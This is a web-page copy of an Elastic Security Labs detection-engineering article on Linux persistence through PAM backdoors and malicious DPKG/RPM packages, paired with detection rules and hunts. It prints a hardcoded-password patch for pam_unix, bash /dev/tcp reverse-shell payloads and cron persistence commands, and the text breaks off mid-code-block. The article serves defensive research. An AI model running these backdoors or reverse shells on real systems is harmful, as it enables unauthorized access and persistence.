1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/approaching-the-summit-on-persistence&amp;title=Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms","slug":"approaching-the-summit-on-persistence","date":"2025-02-11","description":"Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.","image":"Security Labs Images 32.jpg","body":{"raw":"\n# Introduction\n\nWelcome to part four of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.\n\nIf you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\n\n* [*Linux Detection Engineering - A Primer on Persistence Mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)  \n* [*Linux Detection Engineering - A Sequel on Persistence Mechanisms*](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)  \n* [*Linux Detection Engineering - A Continuation on Persistence Mechanisms*](https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms)\n\nIn this publication, we’ll provide insights into:\n\n* How each works (theory)  \n* How to set each up (practice)  \n* How to detect them (SIEM and Endpoint rules)  \n* How to hunt for them (ES|QL and OSQuery reference hunts)\n\nTo make the process even more engaging, we will be leveraging [PANIX](https://github.com/Aegrah/PANIX), a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\n\nBy the end of this series, you'll have a robust knowledge of common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Let’s dive in\\!\n\n# Setup note\n\nTo ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\n\n# T1556.003 - Modify Authentication Process: Pluggable Authentication Modules\n\n[Pluggable Authentication Modules (PAM)](https://www.redhat.com/en/blog/pluggable-authentication-modules-pam) are a powerful framework used in Linux to manage authentication-related tasks. PAM operates as a layer between applications and authentication methods, allowing system administrators to configure flexible and modular authentication policies. These modules are defined in configuration files typically found in `/etc/pam.d/`.\n\nPAM modules themselves are shared library files commonly stored in the following locations:\n\n* `/lib/security/`  \n* `/lib64/security/`  \n* `/lib/x86_64-linux-gnu/security/`  \n* `/usr/lib/security/`  \n* `/usr/lib64/security/`  \n* `/usr/lib/x86_64-linux-gnu/security/`\n\nThese locations house modules that perform authentication tasks, such as validating passwords, managing accounts, or executing scripts during authentication. While PAM provides the essential capability to centralize how secure authentication happens, its flexibility can be abused by attackers to establish persistence through malicious PAM modules. By introducing custom modules or modifying existing configurations, attackers can manipulate authentication flows to capture credentials, manipulate logging to evade detection, grant unauthorized access, or execute malicious code.\n\nThis is a common technique, and some examples include the open-source [Medusa](https://github.com/ldpreload/Medusa) and [Azazel](https://github.com/chokepoint/azazel) rootkits, and by malwares such as [Ebury](https://attack.mitre.org/software/S0377/), and [Skidmap](https://unit42.paloaltonetworks.com/linux-pam-apis/) to establish persistence, capture credentials, and maintain unauthorized access. MITRE ATT\\\u0026CK tracks this technique under the identifier [T1556.003](https://attack.mitre.org/techniques/T1556/003/).\n\n## T1556.003 - Pluggable Authentication Modules: Malicious PAM\n\nMalicious PAM modules are custom-built, malicious shared libraries designed to be loaded during the PAM authentication process. Although there are many different ways to establish a PAM backdoor, in this section we will showcase how PAM can be patched to allow for backdoor SSH access.\n\nCommonly, PAM backdoors will patch the `pam_unix_auth.c` file, which is part of the `pam_unix` module, a widely used PAM module for UNIX-style password authentication. An open-source example of this is the [linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) by [zephrax](https://github.com/zephrax). The typical code that is run to verify the password of a user requesting authentication, looks as follows:\n\n```c\n/* verify the password of this user */\nretval = _unix_verify_password(pamh, name, p, ctrl);\nname = p = NULL;\n```\n\nThe original code calls the `_unix_verify_password` function to validate the provided password (`p`) against the stored password for the user (`name`). The full source code is available [here](https://github.com/linux-pam/linux-pam/blob/fc927d8f1a6d81e5bcf58096871684b35b793fe2/modules/pam_unix/pam_unix_auth.c).\n\nA threat actor may patch this code, and introduce an additional check.\n\n```c\n/* verify the password of this user */\u000bif (strcmp(p, \"_PASSWORD_\") != 0) {\u000b    retval = _unix_verify_password(pamh, name, p, ctrl); \u000b} else {\u000b    retval = PAM_SUCCESS; \u000b}\n```\n\nThe code now checks:\n\n* If the provided password (`p`) is not equal to the string literal `\"_PASSWORD_\"`, it proceeds to call `_unix_verify_password` for standard password validation.  \n* If the password is `\"_PASSWORD_\"`, it skips the password verification entirely and directly returns `PAM_SUCCESS`, indicating successful authentication.\n\nThe patch introduces a hardcoded backdoor password. Any user who enters the password `\"_PASSWORD_\"` will bypass normal password verification and be authenticated successfully, regardless of the actual password stored for the account.\n\n### Persistence through T1556.003 - Pluggable Authentication Modules: Malicious PAM\n\nWe will be leveraging the [setup\\_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) module from PANIX to test this technique and research potential detection opportunities. This patch is easily implemented by downloading the PAM source code for the correct PAM version from the [linux-pam](https://github.com/linux-pam/linux-pam/releases) GitHub repository, looking for the line to replace, and replacing it with your own hardcoded password:\n\n```\necho \"[+] Modifying PAM source...\"\nlocal target_file=\"$src_dir/modules/pam_unix/pam_unix_auth.c\"\nif grep -q \"retval = _unix_verify_password(pamh, name, p, ctrl);\" \"$target_file\"; then\n\tsed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\\\n\tif (p != NULL \u0026\u0026 strcmp(p, \"'$password'\") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' \"$target_file\"\n\techo \"[+] Source modified successfully.\"\nelse\n\techo \"[-] Target string not found in $target_file. Modification failed.\"\n\texit 1\nfi\n```\n\nAfter which we can compile the shared object, and move it to the correct PAM directory.\n\nNow let’s run the [setup\\_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) module. This technique requires several compilation tools and downloading a specific Linux-PAM release. Execute the following PANIX command to inject a malicious module.\n\n```py\n\u003e sudo ./panix.sh --pam --module --password persistence\n\n[+] Determining PAM version...                                                                                          [+] Detected PAM Version: '1.3.1'                                                                                       [+] Downloading PAM source...                                                                                           [+] Download completed. Extracting...                                                                                   [+] Extraction completed.                                                                                               [+] Modifying PAM source...                                                                                             [+] Source modified successfully.                                                                                       [+] Compiling PAM source...                                                                                             [+] PAM compiled successfully.                                                                                          [+] Detecting PAM library directory...\n[+] Backing up original PAM library...                                                                                  [+] Copying PAM library to /lib/x86_64-linux-gnu/security...                                                            [+] Checking SELinux status...                                                                                          [+] Rogue PAM injected!                                                                                                                                                                                                                         \u000b\nYou can now login to any user (including root) with a login shell using your specified password.\nExample: su - user                                                                                                      Example: ssh user@ip\n\n[+] PAM persistence established! \n```\n\nLet’s analyze the events of interest in Discover. Due to the huge load of events originating from compiling PAM source, these events are sorted from oldest (top) to newest (bottom).\n\n![PANIX Malicious PAM module execution visualized in Kibana - part 1](/assets/images/approaching-the-summit-on-persistence/image4.png)\n\nUpon execution of PANIX, we can see `dpkg` being used to discover the running PAM version, followed by a `curl` execution to download the linux-pam source for this identified version. After extracting the `tar` archive, PANIX continues to modify the `pam_unix_auth.c` source code to implement the backdoor.\n\nOnce the above steps are completed, the following events occur (sorted from newest (top) to oldest (bottom)):\n\n![PANIX Malicious PAM module execution visualized in Kibana - part 2](/assets/images/approaching-the-summit-on-persistence/image1.png)\n\nThe `pam_unix.so` file is compiled, and moved to the correct directory (in this case `/lib/x86_64-linux-gnu/security`), overwriting the existing `pam_unix.so` file and successfully activating the backdoor.\n\nLet's review the coverage:\n\n*Detection and endpoint rules that cover Malicious PAM persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [Creation or Modification of Pluggable Authentication Module or Configuration](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml) [Pluggable Authentication Module Creation in Unusual Directory](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation_in_unusual_dir.toml) [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Pluggable Authentication Module Version Discovery](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/discovery_pam_version_discovery.toml) [Pluggable Authentication Module Source Download](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_source_download.toml) |\n| Authentication | [Authentication via Unusual PAM Grantor](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_unusual_pam_grantor.toml) |\n\nTo revert any changes made to the system by PANIX, you can use the corresponding revert module by running:\n\n```\n\u003e ./panix.sh --revert pam\n\n[+] Searching for rogue PAM module\n[+] Restored original PAM module '/lib/x86_64-linux-gnu/security/pam_unix.so'.\n[+] Restarting SSH service...\n[+] SSH service restarted successfully.\n```\n\n### Hunting for T1556.003 - Pluggable Authentication Modules (Malicious PAM)\n\nOther than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the “*Hunting for T1053 \\- scheduled task/job*” section of “[*Linux Detection Engineering \\-  A primer on persistence mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)”. Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).\n\nWe can hunt for PAM persistence through [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html), focusing on file creations (as this technique requires the compilation of modified PAM components) and modifications to PAM-related files and directories. The approach includes monitoring for the following:\n\n* **Creations and/or modifications to PAM configuration files:** Tracks changes to files in the `/etc/pam.d/` and `/lib/security/` directories and the `/etc/pam.conf` file, which are commonly targeted for PAM persistence.\n\nBy combining the [Persistence via Pluggable Authentication Modules](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1556.003](https://attack.mitre.org/techniques/T1556/003/).\n\n## T1556.003 - Pluggable Authentication Modules: pam\\_exec.so\n\nThe `pam_exec.so` module, part of the PAM framework, allows administrators to execute external commands or scripts during the authentication process. This flexibility is powerful for extending authentication workflows with tasks like logging, additional security checks, or notifications. However, this same capability can be exploited by attackers to log passwords or execute backdoors, enabling malicious scripts to run when users authenticate.\n\nTo understand how `pam_exec.so` can be configured, consider the following excerpt from `/etc/pam.d/common-auth`, a file that defines the authentication scheme for Linux systems:\n\n```py\n# /etc/pam.d/common-auth - authentication settings common to all services\n\n# Primary modules\nauth [success=1 default=ignore] pam_unix.so nullok_secure\n\n# Fallback if no module succeeds\nauth requisite pam_deny.so\n\n# Ensure a positive return value if none is set\nauth required pam_permit.so\n```\n\nThis file controls how authentication is processed for all services. Each line defines a module and its behavior. For instance:\n\n* The `auth` keyword indicates that the module operates during the authentication phase.  \n* Control flags, like `[success=1 default=ignore]`, specify how PAM interprets the module's result. For example, `success=1` skips the next module if the current one succeeds.  \n* The `requisite` flag immediately denies authentication if the module fails:  \n  * `auth requisite pam_deny.so`  \n* The `required` flag ensures the module must succeed for authentication to proceed, though subsequent modules in the stack will still execute:  \n  * `auth required pam_permit.so`\n\nModules such as `pam_unix.so` handle traditional UNIX authentication by validating user credentials against `/etc/shadow`. Together, these components define the authentication process and dictate how the system responds to various conditions. For more information and examples, visit the [pam.d man page](https://linux.die.net/man/5/pam.d).\n\nOne way of abusing this mechanism is by leveraging the `pam_exec.so` module to execute an arbitrary script upon authentication through `/etc/pam.d/sshd`. By providing the path to a backdoor script on the host system, we can ensure that our backdoor is executed on every successful SSH authentication. [Group-IB](https://www.group-ib.com/) wrote about this technique in a recent publication dubbed “[*The Duality of the Pluggable Authentication Module (PAM)*](https://www.group-ib.com/blog/pluggable-authentication-module/)”.\n\nA second method involves the modification of `/etc/pam.d/common-auth` for Debian-based systems or `/etc/pam.d/sshd` for Fedora-based systems to log user credentials. This technique was earlier discussed in [Wunderwuzzi’s blog](https://embracethered.com/blog/) called “[*Post Exploitation: Sniffing Logon Passwords with PAM*](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)”. While capturing credentials isn't technically a persistence mechanism, it enables ongoing access to a host by leveraging stolen credentials.\n\nIn the next section we will take a look at how to implement arbitrary command execution through `pam_exec.so` using PANIX.\n\n### Persistence through T1556.003 - Pluggable Authentication Modules: pam\\_exec.so\n\nTo better understand the technique, we will take a look at the [setup\\_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) PANIX module. \n\n```\necho -e \"#!/bin/bash\\nnohup setsid /bin/bash -c '/bin/bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261' \u0026\" \u003e /bin/pam_exec_backdoor.sh\n\nchmod 700 /bin/pam_exec_backdoor.sh\n\npam_sshd_file=\"/etc/pam.d/sshd\"\npam_line=\"session optional pam_exec.so seteuid /bin/pam_exec_backdoor.sh\"\n```\n\nThe first step is to create the backdoor script to execute, this can be any C2 beacon, reverse shell or other means of persistence. PANIX creates a simple reverse shell and grants it execution permissions. Once the backdoor in `/bin/pam_exec_backdoor.sh` is in place, the `/etc/pam.d/sshd` file is modified. The `session` keyword ensures the script runs during user session setup or teardown, while `seteuid` ensures the script runs with the effective user ID (`eUID`) of the authenticated user instead of root.\n\nSince the detection methods for the password harvesting module are quite similar to those of the backdoor module, we will focus on discussing the backdoor module in detail. You are encouraged to explore the [password-harvesting module](https://github.com/Aegrah/PANIX/blob/7a9cf39b35b40ee64bfe6b510f685003ebc043ae/modules/setup_pam.sh#L257) on your own\\!\n\nLet’s run the PANIX module with the following command line arguments:\n\n```\n\u003e sudo ./panix.sh --pam --pam-exec --backdoor --ip 192.168.100.1 --port 2015\n\n[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh...\n[+] /bin/pam_exec_backdoor.sh created and permissions set to 700.\n[+] Modifying /etc/pam.d/sshd to include the PAM_EXEC rule...\n[+] PAM_EXEC rule added to /etc/pam.d/sshd.\n[+] Restarting SSH service to apply changes...\n[+] SSH service restarted successfully.\n[+] PAM_EXEC reverse shell backdoor planted!\n\nAuthenticate to trigger the reverse shell.\n\n[+] PAM persistence established!\n```\n\nAfter triggering the reverse shell by authentication, we can analyze the logs in Discover:\n\n![PANIX pam\\_exec.so module execution visualized in Kibana](/assets/images/approaching-the-summit-on-persistence/image3.png)\n\nAfter PANIX executes, it creates and grants execution permissions to the `/bin/pam_exec_backdoor.sh` backdoor. Next, the backdoor configuration is added to the `/etc/pam.d/sshd` file, and the `SSHD` service is restarted. Upon authentication, we can see the execution of the backdoor by the `SSHD` parent process, starting the reverse shell chain (`pam_exec_backdoor.sh` → `nohup` → `setsid` → `bash`). \n\nLet’s review the coverage. The key distinction between this technique and the previous one is that this method relies on configuration changes rather than compiling a new PAM module, requiring a different set of detection rules to address the threat effectively:\n\n*Detection and endpoint rules that cover pam\\_exec.so persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [Creation or Modification of Pluggable Authentication Module or Configuration](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml) [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Potential Backdoor Execution Through PAM\\_EXEC](https://github.com/elastic/protections-artifacts/blob/8a9e857453566068088f5a24cc1f39b839e60fe8/behavior/rules/linux/persistence_potential_backdoor_execution_through_pam_exec.toml) [Unusual SSHD Child Process](https://github.com/elastic/detection-rules/blob/e528feb989d8fc7f7ca8c4100c0bf5ca7b912a5d/rules/linux/persistence_unusual_sshd_child_process.toml) |\n\nTo revert any changes, you can use the corresponding revert module by running:\n\n```\n\u003e ./panix.sh --revert pam\n\n[+] Removing PAM_EXEC backdoor...\n[+] Removed '/bin/pam_exec_backdoor.sh'.\n[+] Removed PAM_EXEC line from '/etc/pam.d/sshd'.\n[+] Restarting SSH service...\n[+] SSH service restarted successfully.\n[-] PAM_EXEC line not found in '/etc/pam.d/common-auth'.\n```\n\n### Hunting for T1556.003 - Pluggable Authentication Modules: pam\\_exec.so\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to its use. This technique relies on altering PAM configuration files, rather than compilation to execute commands or scripts. The approach includes monitoring for the following:\n\n* **Child processes spawned from SSH:** Tracks processes initiated via SSH sessions, as these may indicate the misuse of `pam_exec.so` for persistence.  \n* **Creations and/or modifications to PAM configuration files:** Tracks changes to files in the `/etc/pam.d/` and `/lib/security/` directories and the `/etc/pam.conf` file, which are commonly targeted for PAM persistence.\n\nBy combining the [Persistence via Pluggable Authentication Modules](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1556.003](https://attack.mitre.org/techniques/T1556/003/).\n\n# T1546.016 - Event Triggered Execution: Installer Packages\n\nPackage managers are used to install, update, and manage software packages. While these tools streamline software management, they can also be abused by attackers to gain initial access or achieve persistence. By hijacking the package manager's execution flow, attackers can insert malicious code that executes during routine package management tasks, such as package installation or updates. This technique is tracked by MITRE under the identifier [T1546.016](https://attack.mitre.org/techniques/T1546/016/).\n\n## T1546.016 - Installer Packages: DPKG \u0026 RPM\n\nPopular managers include `DPKG` (Debian Package) for Debian-based distributions and `RPM` (Red Hat Package Manager) for Red Hat-based systems.\n\n**1. DPKG (Debian Package Manager)**\n\n`DPKG`, the Debian package manager, processes `.deb` packages and supports lifecycle scripts such as `preinst`, `postinst`, `prerm`, and `postrm`. These scripts run at different stages of the package lifecycle, making them a potential target for executing malicious commands. A potential DPKG package file structure used for malicious intent could look like this:\n\n```\nmalicious_package/\u000b├── DEBIAN/\n    ├── control\n    ├── postinst\n```\n\nWhere the post-installation script (`postinst`) runs immediately after a package is installed, allowing the attacker to gain initial access or establish persistence through malicious code.\n\nUpon installation, the `DPKG` scripts (`preinst`, `postinst`, `prerm`, and `postrm`) will be stored in the `/var/lib/dpkg/info/` directory and executed. Package installation logs are stored in `/var/log/dpkg.log`, and record commands like `dpkg -i` and the package names.\n\n**2. RPM (Red Hat Package Manager)**\n\n`RPM`, the Red Hat Package Manager, is the default package manager for Red Hat-based distributions like Fedora, CentOS, and RHEL. It processes `.rpm` packages and supports script sections such as `%pre`, `%post`, `%preun`, and `%postun`, which execute at various stages of the package lifecycle. These scripts can be exploited by attackers to run arbitrary commands during installation, removal, or updates.\n\nA typical malicious RPM package might include a `%post` script embedded directly in the package’s `spec` file. For example, a `%post` script could launch a reverse shell or modify critical system configurations immediately after the package installation completes. An example package layout could look as follows:\n\n```\n~/rpmbuild/\n├── SPECS/\n│    ├── malicious_package.spec\n├── BUILD/\n├── RPMS/\n├── SOURCES/\n├── SRPMS/\n```\n\nUpon installation, `RPM` runs the `%post` script, allowing the attacker to execute the payload. The package manager logs installation activity in `/var/log/rpm.log`, which includes the names and timestamps of installed packages. Additionally, the built `RPM` package is stored in `/var/lib/rpm/`.\n\n### Persistence through T1546.016 - Installer Packages: DPKG \u0026 RPM\n\nPANIX can establish persistence through both `DPKG` and `RPM` within the [setup\\_malicious\\_package.sh](https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_package.sh) module. Starting with `DPKG`, the directory structure is created, the control file is written and the payload is added to the `postinst` file:\n\n```\n# DPKG package setup\nPACKAGE_NAME=\"panix\"\nPACKAGE_VERSION=\"1.0\"\nDEB_DIR=\"${PACKAGE_NAME}/DEBIAN\"\nPAYLOAD=\"#!/bin/sh\\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/${ip}/${port} 0\u003e\u00261' \u0026\"\n\n# Create directory structure\nmkdir -p ${DEB_DIR}\n\n# Write postinst script\necho -e \"${PAYLOAD}\" \u003e ${DEB_DIR}/postinst\nchmod +x ${DEB_DIR}/postinst\n\n# Write control file\necho \"Package: ${PACKAGE_NAME}\" \u003e ${DEB_DIR}/control\necho \"Version: ${PACKAGE_VERSION}\" \u003e\u003e ${DEB_DIR}/control\necho \"Architecture: all\" \u003e\u003e ${DEB_DIR}/control\necho \"Maintainer: https://github.com/Aegrah/PANIX\" \u003e\u003e ${DEB_DIR}/control\necho \"Description: This malicious package was added through PANIX\" \u003e\u003e ${DEB_DIR}/control\n```\n\nAfterwards, all that is left is to build the package with `dpkg-deb` and install it through `dpkg`. \n\n```\n# Build the .deb package\ndpkg-deb --build ${PACKAGE_NAME}\n\n# Install the .deb package\ndpkg -i ${PACKAGE_NAME}.deb\n```\n\nUpon installation, or updating of the package, the payload will be executed. In order to persist on a regular interval, any other persistence mechanism can be used. PANIX leverages `Cron`:\n\n`echo \"*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure \u003e /dev/null 2\u003e\u00261\" | crontab -`\n\nTo forcefully install the package on a certain interval. This is of course not a stealthy mechanism, but serves as a proof of concept to emulate the technique. Let’s run the payload, and analyze the simulated events in Kibana:\n\n```\nsudo ./panix.sh --malicious-package --dpkg --ip 192.168.100.1 --port 2019\ndpkg-deb: building package 'panix' in 'panix.deb'.\nPreparing to unpack panix.deb ...\nUnpacking panix (1.0) over (1.0) ...\nSetting up panix (1.0) ...\nnohup: appending output to 'nohup.out'\n[+] Malicious package persistence established.\n```\n\nLooking at the events generated in Kibana, we can see the following sequence:\n\n![PANIX malicious-package module execution visualized in Kibana (DPKG)](/assets/images/approaching-the-summit-on-persistence/image2.png) \n\nPANIX is executed via `sudo`, after which the `postinst` and `control` files are created. The package is then built using `dpkg-deb`, and installed with `dpkg -i`. Here we can see the `/var/lib/dpkg/info/panix.postinst` executing the reverse shell execution chain (`nohup` → `setsid` → `bash`). After installation, the `crontab` is altered to establish persistence on a one-minute interval.\n\n**RPM**\n\nFor `RPM`, a similar flow as `DPKG` is leveraged. The package is set up using the correct `RPM` package structure, and the `%post` section is set to contain the payload that gets triggered after installation:\n\n```\n# RPM package 